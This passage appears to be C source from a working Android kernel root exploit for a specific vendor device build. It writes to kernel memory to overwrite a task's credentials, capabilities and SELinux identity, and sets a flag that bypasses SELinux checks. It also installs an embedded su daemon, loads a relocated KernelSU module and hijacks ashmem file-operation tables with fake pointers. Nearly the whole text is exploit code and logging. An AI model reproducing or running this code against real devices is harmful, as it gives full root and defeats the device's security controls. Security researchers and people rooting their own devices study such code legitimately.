    const char *mp5 = getenv("GHOSTLOCK_ROOT_MNT");
    if (!mp5) mp5 = "/data/local/tmp/su_mnt";
    mkdir(mp5, 0777);
    {
      size_t sz0 = (size_t)(embedded_su_end - embedded_su_start);
      /* unlink first: a re-used inode may keep a non-shell label from an old
       * run, which makes exec() fail with EPERM for the shell client. */
      unlink("/data/local/tmp/su");
      int f0 = open("/data/local/tmp/su", O_WRONLY | O_CREAT | O_TRUNC, 0755);
      if (f0 >= 0) {
        ssize_t w0 = write(f0, embedded_su_start, sz0);
        pr_info("root5: pre-write su n=%zd/%zu errno=%d\n", w0, sz0, errno);
        fchown(f0, 0, 0);
        fchmod(f0, 0755);
        close(f0);
      }
      /* The inode just created above is exec-denied on this kernel even though
       * ls -Z shows shell_data_file; a byte-for-byte copy produces an inode
       * that does execute.  su2 is the client path users should use. */
      int cs = open("/data/local/tmp/su", O_RDONLY | O_CLOEXEC);
      if (cs >= 0) {
        unlink("/data/local/tmp/su2");
        int cd = open("/data/local/tmp/su2", O_WRONLY | O_CREAT | O_TRUNC, 0755);
        if (cd >= 0) {
          char cb[8192];
          ssize_t rn;
          ssize_t total = 0;
          while ((rn = read(cs, cb, sizeof cb)) > 0) {
            ssize_t off = 0;
            while (off < rn) {
              ssize_t wn = write(cd, cb + off, (size_t)(rn - off));
              if (wn <= 0) break;
              off += wn;
              total += wn;
            }
          }
          fchmod(cd, 0755);
          close(cd);
          pr_info("root5: su client -> /data/local/tmp/su2 n=%zd\n", total);
        }
        close(cs);
      }
    }
    /* The daemon creates the listening socket itself: a shell-domain bind of a
     * unix socket in /data/local/tmp is denied by SELinux on this build.  The
     * daemon instead labels the socket via /proc/self/attr/sockcreate (it runs
     * with the per-task AVC bypass), so an adb shell client can connect. */
    unlink("/data/local/tmp/su_sock_path");
    setenv("SU_SOCK_LABEL", "u:r:shell:s0", 1);
    int lfd = -1;
    char sockpath[128];
    snprintf(sockpath, sizeof sockpath, "/data/local/tmp/temp_su.sock");
    pid_t child = fork();
    if (child == 0) {
      prctl(PR_SET_NAME, "root5child", 0, 0, 0);
      /* Take a private cred copy before the parent patches anything.  Pointing
       * task->cred at &init_cred (the old behaviour) means the task's first
       * execve() and its exit each put_cred() the shared init_cred twice; after
       * ~2 refs the static .data object is freed into cred_jar and the whole
       * system starts handing out a bogus cred - a delayed, system-wide crash.
       * setresuid(same) always goes through prepare_creds()/commit_creds() and
       * gives this task its own cred + its own SELinux blob. */
      if (!getenv("GHOSTLOCK_ROOT5_INITCRED")) {
        uid_t u = getuid();
        gid_t g = getgid();
        errno = 0;
        int pr1 = setresuid(u, u, u);
        int pe1 = errno;
        errno = 0;
        int pr2 = setresgid(g, g, g);
        int pe2 = errno;
        sh->priv_ret = pr1 | pr2;
        sh->priv_errno = pr1 ? pe1 : pe2;
        __sync_synchronize();
      }
      uintptr_t mytask = perf_task_from_sched();
      sh->task = mytask;
      __sync_synchronize();
      sh->ready = 1;
      while (!sh->go) {
        __sync_synchronize();
      }
      __sync_synchronize();
      sh->stage = 1;
      if (getenv("GHOSTLOCK_ROOT5_REPAIR")) {
        /* Boot-loop repair: drop the runtime caches (dalvik-cache) so ART can
         * regenerate them on the next boot. */
        errno = 0;
        int n = nftw("/data/dalvik-cache", repair_unlink_cb, 64,
                     FTW_DEPTH | FTW_PHYS);
        int ne = errno;
        sh->repair_ret = n;
        sh->stage = 6;
        __sync_synchronize();
        int vf = open("/data/local/tmp/physrw_verdict.txt",
                      O_WRONLY | O_CREAT | O_TRUNC, 0666);
        if (vf >= 0) {
          char vb[96];
          int vn = snprintf(vb, sizeof vb, "REPAIR_OK n=%d errno=%d\n", n, ne);
          ssize_t vw = write(vf, vb, (size_t)vn);
          (void)vw;
          close(vf);
        }
        sync();
        _exit(n >= 0 ? 0 : 1);
      }
      int uid = (int)getuid();
      sh->uid = uid;
      sh->stage = 2;
      pr_info("root5 child: stage2 uid=%d mp=%s\n", uid, mp5);
      int mr = -1, me = 0;
      if (!getenv("GHOSTLOCK_ROOT5_MAP")) {
        if (getenv("GHOSTLOCK_ROOT5_NOMOUNT")) { mr = 0; me = 0; }
        else {
          errno = 0;
          sh->stage = 20;
          mr = mount("tmpfs", mp5, "tmpfs", 0, "mode=0755,size=16m");
          me = errno;
          pr_info("root5 child: mount ret=%d errno=%d\n", mr, me);
          sh->stage = 21;
        }
      } else {
        int last = 0;
        for (;;) {
          while (sh->req == last) { __sync_synchronize(); }
          last = sh->req;
          if (getenv("GHOSTLOCK_ROOT5_NOMOUNT")) { mr = 0; me = 0; }
          else {
            errno = 0;
            mr = mount("tmpfs", mp5, "tmpfs", 0, "mode=0755,size=16m");
            me = errno;
          }
          sh->mount_ret = mr;
          sh->mount_errno = me;
          __sync_synchronize();
          sh->ack = last;
          if (mr == 0) break;
        }
      }
      sh->mount_ret = mr;
      sh->mount_errno = me;
      sh->stage = 3;
      pr_info("root5 child: at stage3\n");
      {
        const char *top = getenv("GHOSTLOCK_ROOT5_TEST_OPEN");
        if (top) {
          sh->stage = 25;
          errno = 0;
          int tf = open(top, O_RDONLY | O_CLOEXEC);
          int te = errno;
          sh->stage = 26;
          pr_info("root5 child: test open %s = %d errno=%d\n", top, tf, te);
          if (tf >= 0) close(tf);
        }
      }
      /* Optional KernelSU bring-up: relocate ksu_tpl.ko for this boot's
       * KASLR base, then load it with finit_module().  The module turns the
       * temporary root into the manager-managed one for the rest of this
       * boot (it survives until reboot).  GHOSTLOCK_KSU_CRC must be this
       * kernel's __crc_module_layout; PD2118 9.5.3 = 0x44017a5c (computed from
       * the __kcrctab entry parallel to the module_layout __ksymtab entry). */
      if (getenv("GHOSTLOCK_KSU")) {
        /* Do the module work in a throw-away worker: an oops/exit in this
         * path must not take the temp su daemon down with it. */
        pid_t kp = fork();
        if (kp == 0) {
        sh->ksu_stage = 1;
        pr_info("root5 ksu: enter\n");
        const char *kdir = getenv("GHOSTLOCK_KSU_DIR");
        if (!kdir) kdir = "/data/local/tmp/kt";
        const char *kcrc = getenv("GHOSTLOCK_KSU_CRC");
        if (!kcrc) kcrc = "44017a5c";
        mkdir("/data/adb", 0700);
        mkdir("/data/adb/ktu", 0700);
        mkdir("/data/adb/ktu/bin", 0700);
        mkdir("/data/adb/modules", 0700);
        sh->ksu_stage = 3;
        pr_info("root5 ksu: mkdir done errno=%d\n", errno);
        int mf = open("/data/local/tmp/Kmode", O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (mf >= 0) { ssize_t z = write(mf, "M", 1); (void)z; close(mf); }
        int af = open("/data/local/tmp/Kavc", O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (af >= 0) { ssize_t z = write(af, "0", 1); (void)z; close(af); }
        sh->ksu_stage = 4;
        pr_info("root5 ksu: kmode/kavc done errno=%d\n", errno);
        /* Best effort: the host script may have staged ksud payloads.  The
         * module expects /data/adb/ktud (daemon) and /data/adb/ktu/bin/*. */
        {
          static const struct { const char *src, *dst; } kcp[] = {
            {"/data/local/tmp/kt/ktud", "/data/adb/ktud"},
            {"/data/local/tmp/kt/ksud", "/data/adb/ktu/bin/ksud"},
            {"/data/local/tmp/kt/ksud_shim", "/data/adb/ktu/bin/su"},
          };
          for (size_t ki = 0; ki < sizeof kcp / sizeof kcp[0]; ki++) {
            int si = open(kcp[ki].src, O_RDONLY | O_CLOEXEC);
            if (si < 0) continue;
            int di = open(kcp[ki].dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);
            if (di >= 0) {
              char cbuf[8192];
              ssize_t rn;
              while ((rn = read(si, cbuf, sizeof cbuf)) > 0) {
                ssize_t off = 0;
                while (off < rn) {
                  ssize_t wn = write(di, cbuf + off, (size_t)(rn - off));
                  if (wn <= 0) break;
                  off += wn;
                }
              }
              fchmod(di, 0755);
              close(di);
            }
            close(si);
          }
        }
        sh->ksu_stage = 5;
        pr_info("root5 ksu: copy done errno=%d\n", errno);
        pr_info("root5 ksu: dirs/files ready\n");
        const char *muid = getenv("GHOSTLOCK_KSU_MUID");
        if (muid && *muid) {
          int pf = open("/data/local/tmp/Kpad_appid.txt",
                        O_WRONLY | O_CREAT | O_TRUNC, 0644);
          if (pf >= 0) {
            ssize_t z = write(pf, muid, strlen(muid));
            (void)z;
            close(pf);
          }
        }
        uint64_t kbase = 0;
        int bf = open("/data/local/tmp/Kaslr.txt", O_RDONLY | O_CLOEXEC);
        if (bf >= 0) {
          char bb[40];
          ssize_t n = read(bf, bb, sizeof bb - 1);
          close(bf);
          if (n > 0) { bb[n] = 0; kbase = strtoull(bb, NULL, 16); }
        }
        char tpl[200], runko[200], syms[200], cmd[1000];
        snprintf(tpl, sizeof tpl, "%s/ksu_tpl.ko", kdir);
        snprintf(runko, sizeof runko, "%s/ksu_run.ko", kdir);
        snprintf(syms, sizeof syms, "%s/syms.txt", kdir);
        snprintf(cmd, sizeof cmd,
                 "%s/koreloc %s %016llx %s %s --from-text %s",
                 kdir, syms, (unsigned long long)kbase, tpl, runko, kcrc);
        sh->ksu_stage = 7;
        pr_info("root5 ksu: reloc cmd=%s\n", cmd);
        errno = 0;
        sh->ksu_reloc = run_shell_cmd(cmd);
        sh->ksu_stage = 8;
        pr_info("root5 ksu: reloc=%d errno=%d\n", sh->ksu_reloc, errno);
        int kf = open(runko, O_RDONLY | O_CLOEXEC);
        if (kf >= 0) {
          errno = 0;
          long lr = syscall(SYS_finit_module, kf, "", 0);
          sh->ksu_load_ret = (int)lr;
          sh->ksu_load_errno = errno;
          close(kf);
        } else {
          sh->ksu_load_ret = -2;
          sh->ksu_load_errno = errno;
        }
        sh->ksu_stage = 9;
        if (sh->ksu_load_ret == 0) {
          run_shell_cmd("chcon -R u:object_r:ksu_file:s0 /data/adb 2>/dev/null");
        }
        sh->ksu_done = 1;
        __sync_synchronize();
        pr_info("root5 ksu: base=%016llx reloc=%d load=%d errno=%d\n",
                (unsigned long long)kbase, sh->ksu_reloc, sh->ksu_load_ret,
                sh->ksu_load_errno);
        _exit(0);
        }
        if (kp > 0) {
          int kst = 0;
          while (waitpid(kp, &kst, 0) < 0 && errno == EINTR) {
          }
          if (!sh->ksu_done) sh->ksu_done = -2;
          pr_info("root5 ksu: worker status=%#x stage=%d reloc=%d load=%d "
                  "errno=%d\n", kst, sh->ksu_stage, sh->ksu_reloc,
                  sh->ksu_load_ret, sh->ksu_load_errno);
        } else {
          pr_error("root5 ksu: fork failed errno=%d\n", errno);
        }
      }
      char sup[160];
      snprintf(sup, sizeof sup, "%s/su", mp5);
      int wrote = -1;
      if (mr == 0) {
        size_t sz = (size_t)(embedded_su_end - embedded_su_start);
        sh->stage = 30;
        int fd = open(sup, O_WRONLY | O_CREAT | O_TRUNC, 0755);
        sh->stage = 31;
        if (fd >= 0) {
          wrote = (int)write(fd, embedded_su_start, sz);
          sh->stage = 32;
          fchown(fd, 0, 0);
          sh->stage = 33;
          fchmod(fd, 0755);
          sh->stage = 34;
          close(fd);
        }
      }
      sh->wrote = wrote;
      sh->stage = 4;
      pr_info("root5 child: su write done wrote=%d\n", wrote);
      const char *run = (mr == 0 && wrote > 0) ? sup : "/data/local/tmp/su";
      if (lfd >= 0) {
        char lb[16];
        snprintf(lb, sizeof lb, "%d", lfd);
        setenv("SU_LISTEN_FD", lb, 1);
      }
      pid_t dp = fork();
      if (dp == 0) {
        setsid();
        execl(run, "su", "--daemon", (char *)NULL);
        _exit(127);
      }
      int sok = 0;
      for (int i = 0; i < 50; i++) {
        if (access("/data/local/tmp/temp_su.sock", F_OK) == 0) { sok = 1; break; }
        usleep(100000);
      }
      sh->daemon = (int)dp;
      sh->sock = sok;
      sh->exec_errno = errno;
      sh->stage = 5;
      __sync_synchronize();
      pr_success("root5 child: uid=%d mount=%d errno=%d run=%s wrote=%d "
                 "daemon=%d sock=%d\n", uid, mr, me, run, wrote, (int)dp, sok);
      int vf = open("/data/local/tmp/physrw_verdict.txt",
                    O_WRONLY | O_CREAT | O_TRUNC, 0666);
      if (vf >= 0) {
        char vb[160];
        int vn = snprintf(vb, sizeof vb,
                          "ROOT5_OK uid=%d mount=%d sock=%d\n", uid, mr, sok);
        ssize_t vw = write(vf, vb, (size_t)vn);
        (void)vw;
        close(vf);
      }
      sync();
      _exit(sok ? 42 : 45);
    }
    int sr = physrw_setup();
    if (sr) { pr_error("root5: setup %d\n", sr); return 1; }
    for (int i = 0; i < 500 && !sh->ready; i++) usleep(1000);
    uintptr_t found = sh->task;
    pr_info("root5: child pid=%d task=%016zx ready=%d\n", (int)child,
            (size_t)found, sh->ready);
    if (!found) return 5;
    char comm5[17];
    memset(comm5, 0, sizeof comm5);
    pr_read(found + TASK_COMM_OFF, comm5, 16);
    pr_info("root5: child comm=[%s]\n", comm5);
    if (!strstr(comm5, "root5child")) {
      pr_error("root5: task not confirmed, aborting\n");
      return 5;
    }
    /* Default: patch the child's own (private) cred object in place.  The old
     * init_cred swap is kept behind GHOSTLOCK_ROOT5_INITCRED=1 for comparison.
     * It is not the default any more because task creds are refcounted: every
     * execve()/exit of such a task does put_cred(&init_cred) twice and frees the
     * static .data object into cred_jar (system-wide delayed corruption). */
    int keep_shell_sid = getenv("GHOSTLOCK_ROOT5_SHELLCRED") != NULL;
    int use_init_cred = getenv("GHOSTLOCK_ROOT5_INITCRED") != NULL;
    int skip_cred = getenv("GHOSTLOCK_ROOT5_NOPATCH") != NULL ||
                    getenv("GHOSTLOCK_ROOT5_FLAGSONLY") != NULL;
    int skip_flags = getenv("GHOSTLOCK_ROOT5_NOPATCH") != NULL ||
                     getenv("GHOSTLOCK_ROOT5_CREDONLY") != NULL;
    if (skip_cred) {
      pr_info("root5: skip cred patch (NOPATCH/FLAGSONLY)\n");
    } else if (!use_init_cred) {
      if (sh->priv_ret != 0) {
        /* Do NOT fall back to patching whatever cred the child shares with the
         * adb shell - that would turn the shell session root as a side effect. */
        pr_error("root5: private cred setup failed %d/%d, aborting\n",
                 sh->priv_ret, sh->priv_errno);
        return 6;
      }
      uint64_t cc = 0;
      ssize_t cr = pr_read(found + TASK_CRED_OFF, &cc, sizeof cc);
      pr_info("root5: privcred n=%zd p=%016llx setresuid=%d/%d\n", cr,
              (unsigned long long)cc, sh->priv_ret, sh->priv_errno);
      unsigned char patch[0x4c];
      memset(patch, 0, sizeof patch);
      uint64_t full = 0x3fffffffffULL;
      put64(patch, 0x2c, full); /* cred+0x30 cap_permitted */
      put64(patch, 0x34, full); /* cred+0x38 cap_effective */
      put64(patch, 0x3c, full); /* cred+0x40 cap_bset      */
      if (cc) {
        errno = 0;
        ssize_t pw;
        if (getenv("GHOSTLOCK_ROOT5_UID_ONLY")) {
          uint64_t idz = 0;
          const char *uv = getenv("GHOSTLOCK_ROOT5_UID_VAL");
          if (uv) idz = strtoull(uv, NULL, 0);
          pw = pr_write((uintptr_t)cc + 4, &idz, sizeof idz);
        } else if (getenv("GHOSTLOCK_ROOT5_IDS_ONLY")) {
          unsigned char idb[0x24];
          memset(idb, 0, sizeof idb);
          pw = pr_write((uintptr_t)cc + 4, idb, sizeof idb);
        } else if (getenv("GHOSTLOCK_ROOT5_CAPS_ONLY")) {
          pw = pr_write((uintptr_t)cc + 0x30, &full, 8);
          pw = pr_write((uintptr_t)cc + 0x38, &full, 8);
          pw = pr_write((uintptr_t)cc + 0x40, &full, 8);
        } else {
          pw = pr_write((uintptr_t)cc + 4, patch, sizeof patch);
        }
        pr_info("root5: privcred ids/caps n=%zd errno=%d\n", pw, errno);
        if (!getenv("GHOSTLOCK_ROOT5_NOFIXUSER")) {
          /* uid 0 with cred->user still pointing at the shell's user_struct
           * makes the first path syscall exit this vendor kernel.  Copy the
           * root_user pointer from init_cred (and raise its refcount so the
           * exit path cannot underflow it). */
          uint64_t ru = 0;
          ssize_t rr = pr_read(text_addr(INIT_CRED) + 0x80, &ru, sizeof ru);
          if (rr == 8 && is_kernel_ptr(ru)) {
            uint32_t big = 0x40000000u;
            pr_write((uintptr_t)ru, &big, sizeof big);
            ssize_t rw = pr_write((uintptr_t)cc + 0x80, &ru, sizeof ru);
            pr_info("root5: privcred fixuser n=%zd user=%016llx\n", rw,
                    (unsigned long long)ru);
          } else {
            pr_info("root5: privcred fixuser read n=%zd p=%016llx\n", rr,
                    (unsigned long long)ru);
          }
        }
        if (!keep_shell_sid) {
          /* Move the private cred's SID to SECINITSID_KERNEL (=1), the same
           * security state the init_cred swap produced, without sharing the
           * cred object.  cred->security is a private copy after
           * security_prepare_creds(), so this only affects this task. */
          uint64_t sec = 0;
          ssize_t sr2 = pr_read((uintptr_t)cc + CRED_SECURITY_OFF, &sec, 8);
          if (sr2 == 8 && is_direct_ptr(sec)) {
            uint32_t sid_pair[2] = {SELINUX_KERNEL_SID, SELINUX_KERNEL_SID};
            errno = 0;
            ssize_t sw = pr_write((uintptr_t)sec, sid_pair, sizeof sid_pair);
            pr_info("root5: privcred sid n=%zd errno=%d sec=%016llx\n", sw,
                    errno, (unsigned long long)sec);
          } else {
            pr_error("root5: privcred bad security n=%zd p=%016llx\n", sr2,
                     (unsigned long long)sec);
          }
        }
      }
    } else {
      uint64_t ic = (uint64_t)text_addr(INIT_CRED);
      ssize_t w1 = pr_write(found + TASK_REAL_CRED_OFF, &ic, sizeof ic);
      ssize_t w2 = pr_write(found + TASK_CRED_OFF, &ic, sizeof ic);
      /* Safety net: init_cred's usage is 4 and commit_creds()/exit_creds()
       * decrement it.  Raise it so it can never be freed into cred_jar. */
      uint32_t big_usage = 0x40000000u;
      ssize_t uw = pr_write((uintptr_t)text_addr(INIT_CRED), &big_usage,
                            sizeof big_usage);
      pr_info("root5: child cred writes real=%zd cred=%zd usage=%zd\n", w1, w2,
              uw);
    }
    /* avc_has_perm() ends with  rc = denied & ~(signbit(current->flags) ? -1 : 0)
     * (disassembly @0x4a3440), i.e. bit 63 of task->thread_info.flags is a
     * per-task "ignore SELinux denial" flag on this vendor kernel.  Set it for
     * the child, which is exactly what the permissive map was trying to do. */
    if (!skip_flags) {
      uint64_t flags = 0;
      ssize_t fr = pr_read(found, &flags, sizeof flags);
      pr_info("root5: child flags n=%zd v=%016llx\n", fr,
              (unsigned long long)flags);
      flags |= 0x8000000000000000ULL;
      ssize_t fw = pr_write(found, &flags, sizeof flags);
      pr_info("root5: child flags write n=%zd errno=%d\n", fw, errno);
    }
    __sync_synchronize();
    sh->go = 1;
    if (getenv("GHOSTLOCK_ROOT5_MAP")) {
      uintptr_t state = text_addr(SELINUX_ENFORCING) - 1;
      uintptr_t policy = 0;
      ssize_t pn = pr_read(state + 0x18, &policy, sizeof policy);
      pr_info("root5: policy n=%zd p=%016zx\n", pn, (size_t)policy);
      if (policy) {
        for (long S = 0; S < 8192; S += 384) {
          g_ebit_startbit = S;
          unsigned char map2[16];
          memset(map2, 0, sizeof map2);
          put64(map2, 0, (uint64_t)(pr_asma + 0xa0));
          put32(map2, 8, (uint32_t)(S + 384));
          ssize_t mw = pr_write(policy + 0x1d0, map2, sizeof map2);
          __sync_synchronize();
          int req = (int)(S / 384) + 1;
          sh->req = req;
          for (int w = 0; w < 2000 && sh->ack != req; w++) usleep(1000);
          pr_info("root5: S=%ld mapw=%zd mount=%d errno=%d\n", S, mw,
                  sh->mount_ret, sh->mount_errno);
          if (sh->mount_ret == 0) break;
          if (mw != (ssize_t)sizeof map2) break;
        }
      }
    }
    __sync_synchronize();
    int st = 0;
    int reaped = 0;
    for (int w = 0; w < 30000; w++) {
      pid_t rr = waitpid(child, &st, WNOHANG);
      if (rr == child) { reaped = 1; break; }
      usleep(1000);
    }
    if (!reaped) {
      pr_error("root5: child did not exit, stage=%d\n", sh->stage);
      kill(child, SIGKILL);
      waitpid(child, &st, 0);
    }
    pr_info("root5: child wait exited=%d code=%d signaled=%d sig=%d\n",
            WIFEXITED(st) ? 1 : 0, WIFEXITED(st) ? WEXITSTATUS(st) : -1,
            WIFSIGNALED(st) ? 1 : 0, WIFSIGNALED(st) ? WTERMSIG(st) : 0);
    pr_info("root5: child status=%#x reaped=%d stage=%d uid=%d mount=%d "
            "merrno=%d wrote=%d daemon=%d sock=%d eerrno=%d repair=%d "
            "ksu=%d/%d/%d/%d\n", st,
            reaped, sh->stage, sh->uid, sh->mount_ret, sh->mount_errno,
            sh->wrote, sh->daemon, sh->sock, sh->exec_errno, sh->repair_ret,
            sh->ksu_done, sh->ksu_reloc, sh->ksu_load_ret, sh->ksu_load_errno);
    /* End-to-end self-test from a *shell* process (this one): can a plain
     * adb-shell-equivalent client reach the su daemon and run a command? */
    int client_ret = -100, client_errno = 0;
    char cout[256];
    memset(cout, 0, sizeof cout);
    if (sh->sock == 1) {
      int cfd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
      struct sockaddr_un sun;
      memset(&sun, 0, sizeof sun);
      sun.sun_family = AF_UNIX;
      sun.sun_path[0] = 0;
      {
        const char *an = "ghostlock_su";
        size_t al = strlen(an);
        if (al > sizeof(sun.sun_path) - 1) al = sizeof(sun.sun_path) - 1;
        memcpy(sun.sun_path + 1, an, al);
      }
      socklen_t slen = (socklen_t)(offsetof(struct sockaddr_un, sun_path) + 1 +
                                   strlen("ghostlock_su"));
      errno = 0;
      client_ret = cfd >= 0 ? connect(cfd, (struct sockaddr *)&sun,
                                      slen) : -1;
      client_errno = errno;
      if (client_ret == 0) {
        char mode = 'C';
        uint32_t len = 2;
        ssize_t w1 = write(cfd, &mode, 1);
        ssize_t w2 = write(cfd, &len, sizeof len);
        ssize_t w3 = write(cfd, "id", 2);
        (void)w1; (void)w2; (void)w3;
        ssize_t rn2 = read(cfd, cout, sizeof cout - 1);
        if (rn2 > 0) cout[rn2] = 0;
        close(cfd);
      }
      pr_info("root5: client connect=%d errno=%d out=[%s]\n", client_ret,
              client_errno, cout);
    }
    int vf = open("/data/local/tmp/physrw_verdict.txt", O_RDONLY | O_CLOEXEC);
    char vb[160];
    ssize_t vn = vf >= 0 ? read(vf, vb, sizeof vb - 1) : -1;
    if (vf >= 0) close(vf);
    if (vn > 0) vb[vn] = 0; else vb[0] = 0;
    pr_success("root5: verdict=[%s] client_ok=%d\n", vb, client_ret == 0);
    sync();
    _exit(strstr(vb, "ROOT5_OK") ? 42 : 45);
  }

  /* GHOSTLOCK_FILE_HIJACK=1: hijack *our own file's* f_op instead of the
   * read-only ashmem_misc slot.  file is a heap object, so file->f_op
   * (offset 0x28) is writable; the fake fops lives in asma->name. */
  if (getenv("GHOSTLOCK_FILE_HIJACK")) {
    pin_to_core(CORE);
    if (!slide_leak_kernel_base()) { pr_error("slide failed\n"); return 1; }
    extern uintptr_t perf_regs_asma_leak(int afd);
    extern uintptr_t perf_regs_ashmem_file(int afd);
    int hf = open(ashmem_path, O_RDWR | O_CLOEXEC | O_NONBLOCK);
    if (hf < 0) { pr_error("file hijack: no ashmem fd errno=%d\n", errno); return 2; }
    /* Give the area a size: read() on a zero-sized ashmem blocks. */
    ioctl(hf, 0x7704, (unsigned long)0x1000);
    uintptr_t asma = perf_regs_asma_leak(hf);
    uintptr_t file = perf_regs_ashmem_file(hf);
    pr_info("file hijack: asma=%016zx file=%016zx\n", (size_t)asma, (size_t)file);
    if (!asma || !file) return 3;
    uintptr_t fops = asma + 8;
    /* Baseline read/write behaviour of the real ashmem fd. */
    char rbuf[16];
    errno = 0;
    ssize_t r0 = read(hf, rbuf, sizeof rbuf);
    int r0e = errno;
    errno = 0;
    ssize_t w0 = write(hf, "Z", 1);
    int w0e = errno;
    pr_info("file hijack: before read=%zd/%d write=%zd/%d\n", r0, r0e, w0, w0e);
    unsigned char blob[ASHMEM_NAME_LEN];
    memset(blob, 0, sizeof blob);
    memset(blob, 'A', 8);
    uint64_t nz = text_addr(NOOP_LLSEEK_OFF);
    for (size_t off = FOPS_LLSEEK_OFF; off <= FOPS_SHOW_FDINFO_OFF; off += 8) {
      put64(blob, 8 + off, nz);
    }
    put64(blob, 8 + FOPS_OWNER_OFF, 0x4141414141414141ULL);
    if (getenv("GHOSTLOCK_FOPS_IOCTL_ASHMEM")) {
      /* Dispatch probe: keep the *real* ashmem_ioctl in the table, so a
       * successful hijack must still answer ioctl(0x7706) with 7. */
      put64(blob, 8 + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
      put64(blob, 8 + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
    }
    if (ioctl(hf, ASHMEM_SET_NAME, blob) != 0) {
      pr_error("file hijack: setname errno=%d\n", errno);
      return 4;
    }
    char nb[64];
    setenv("GHOSTLOCK_SKIP_PAGE", "1", 1);
    setenv("GHOSTLOCK_NO_PROBE", "1", 1);
    /* chain A: owner = NULL (heap write, should work) */
    snprintf(nb, sizeof nb, "0x%zx", (size_t)fops);
    setenv("GHOSTLOCK_ZWRITE2", nb, 1);
    setenv("GHOSTLOCK_ZWRITE_SLOT", "0", 1);
    int ra = run_chain_isolated();
    pr_info("file hijack: chain A ret=%d\n", ra);
    if (ra != 0) { _exit(46); }
    /* chain B: file->f_op = fops */
    unsetenv("GHOSTLOCK_ZWRITE2");
    snprintf(nb, sizeof nb, "0x%zx", (size_t)(file + 0x28));
    setenv("GHOSTLOCK_VALUEWRITE", nb, 1);
    snprintf(nb, sizeof nb, "0x%zx", (size_t)fops);
    setenv("GHOSTLOCK_VALUEWRITE_PC", nb, 1);
    int rb = -1, got = -1, gerr = 0;
    for (int attempt = 0; attempt < 3; attempt++) {
      setenv("GHOSTLOCK_ZWRITE_SLOT", attempt == 0 ? "1" : (attempt == 1 ? "2" : "3"), 1);
      rb = run_chain_isolated();
      errno = 0;
      got = ioctl(hf, 0x7706);
      gerr = errno;
      pr_info("file hijack: chain B attempt=%d ret=%d ioctl=%d/%d\n",
              attempt, rb, got, gerr);
      if (rb == 0 && got != 7) break;
      /* a fresh ashmem area for the next attempt (the old one is consumed) */
      if (attempt + 1 < 3) {
        int nf = open(ashmem_path, O_RDWR | O_CLOEXEC | O_NONBLOCK);
        if (nf >= 0) {
          uintptr_t nf_asma = perf_regs_asma_leak(nf);
          uintptr_t nf_file = perf_regs_ashmem_file(nf);
          if (nf_asma && nf_file) {
            fops = nf_asma + 8;
            if (ioctl(nf, ASHMEM_SET_NAME, blob) == 0) {
              char zb[64];
              snprintf(zb, sizeof zb, "0x%zx", (size_t)fops);
              setenv("GHOSTLOCK_ZWRITE2", zb, 1);
              hf = nf;
              file = nf_file;
            }
          }
        }
        snprintf(nb, sizeof nb, "0x%zx", (size_t)(file + 0x28));
        setenv("GHOSTLOCK_VALUEWRITE", nb, 1);
        snprintf(nb, sizeof nb, "0x%zx", (size_t)fops);
        setenv("GHOSTLOCK_VALUEWRITE_PC", nb, 1);
      }
    }
    /* Dispatch probe that does not go through ioctl/SELinux: read/write use
     * file_permission, and our fake table maps read/write to noop_llseek. */
    char rb2[16];
    errno = 0;
    ssize_t r1 = read(hf, rb2, sizeof rb2);
    int r1e = errno;
    errno = 0;
    ssize_t w1 = write(hf, "Z", 1);
    int w1e = errno;
    int want = getenv("GHOSTLOCK_FOPS_IOCTL_ASHMEM") ? 7 : 0;
    pr_success("file hijack: fops=%016zx ioctl=%d/%d after read=%zd/%d write=%zd/%d (want %d)\n",
               (size_t)fops, got, gerr, r1, r1e, w1, w1e, want);
    sync();
    int changed = (r1 != r0) || (r1e != r0e) || (w1 != w0) || (w1e != w0e);
    _exit(changed ? 42 : 45);
  }

  /* GHOSTLOCK_FOPS_HIJACK=1: the real thing - leak ashma, build a complete
   * fake file_operations in asma+8 (all fields valid pointers, owner a
   * placeholder), zero the owner, then point ashmem_misc.fops at it.  A new
   * /dev/ashmem fd must then answer ioctl(0x7706) with 0 instead of 7. */
  if (getenv("GHOSTLOCK_FOPS_HIJACK")) {
    pin_to_core(CORE);
    if (!slide_leak_kernel_base()) { pr_error("slide failed\n"); return 1; }
    extern uintptr_t perf_regs_asma_leak(int afd);
    int hf = open_ashmem_device();
    if (hf < 0) { pr_error("hijack: no ashmem fd errno=%d\n", errno); return 2; }
    uintptr_t asma = perf_regs_asma_leak(hf);
    pr_info("hijack: asma=%016zx\n", (size_t)asma);
    if (!asma) return 3;
    uintptr_t fops = asma + 8;
    if (getenv("GHOSTLOCK_SLOT_ZTEST")) {
      /* Address test only: zero the ashmem_misc fops slot.  If the address is
       * right, misc_open() then finds fops == NULL and open() fails (ENODEV),
       * which the watchdog reports - no hijack, no crash. */
      char zb[64];
      setenv("GHOSTLOCK_SKIP_PAGE", "1", 1);
      setenv("GHOSTLOCK_NO_PROBE", "1", 1);
      snprintf(zb, sizeof zb, "0x%zx", (size_t)text_addr(ASHMEM_MISC_FOPS));
      setenv("GHOSTLOCK_ZWRITE2", zb, 1);
      setenv("GHOSTLOCK_ZWRITE_SLOT", "0", 1);
      run_main_route_threads();
      pr_success("slot ztest: zeroed %s\n", zb);
      sync();
      _exit(0);
    }
    unsigned char blob[ASHMEM_NAME_LEN];
    memset(blob, 0, sizeof blob);
    memset(blob, 'A', 8);
    uint64_t nz = text_addr(NOOP_LLSEEK_OFF);
    for (size_t off = FOPS_LLSEEK_OFF; off <= FOPS_SHOW_FDINFO_OFF; off += 8) {
      put64(blob, 8 + off, nz);
    }
    put64(blob, 8 + FOPS_OWNER_OFF, 0x4141414141414141ULL);
    /* Keep open/release/mmap/show_fdinfo as noop_llseek as well: they are then
     * harmless (noop_llseek only reads file->f_pos) and misc_open()'s call to
     * f_op->open() returns 0, so the new fd really gets our fops without
     * running ashmem_open() against the misc device's inode (that oopsed). */
    put64(blob, 8 + FOPS_MMAP_OFF, nz);
    put64(blob, 8 + FOPS_OPEN_OFF, nz);
    put64(blob, 8 + FOPS_RELEASE_OFF, nz);
    put64(blob, 8 + FOPS_SHOW_FDINFO_OFF, nz);
